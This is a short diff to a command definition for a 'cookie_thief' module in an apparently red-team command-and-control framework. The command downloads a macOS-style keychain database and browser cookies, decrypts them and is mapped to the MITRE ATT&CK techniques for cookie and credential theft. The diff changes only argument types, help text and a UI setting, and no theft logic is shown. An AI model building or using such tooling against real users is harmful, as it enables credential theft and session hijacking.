@@ -9,7 +9,7 @@ class CookieThiefArguments(TaskArguments):
         self.args = {
             "password": CommandParameter(
                 name="User Login Password",
-                type=ParameterType.Credential_Value,
+                type=ParameterType.String,
                 description="p@55w0rd_here for user login",
                 required=True,
                 ui_position=1
@@ -39,10 +39,10 @@ class CookieThiefArguments(TaskArguments):
 class CookieThiefCommand(CommandBase):
     cmd = "cookie_thief"
     needs_admin = True
-    help_cmd = "cookie_thief {user account password} {browser}"
+    help_cmd = "cookie_thief {user account password} {browser} {username}"
     description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
     version = 1
-    supported_ui_features = ["file_browser:download"] #CHANGE
+    #supported_ui_features = ["file_browser:download"] #CHANGE
     author = "@antman"
     parameters = []
     attackmapping = ["T1539", "T1555"]
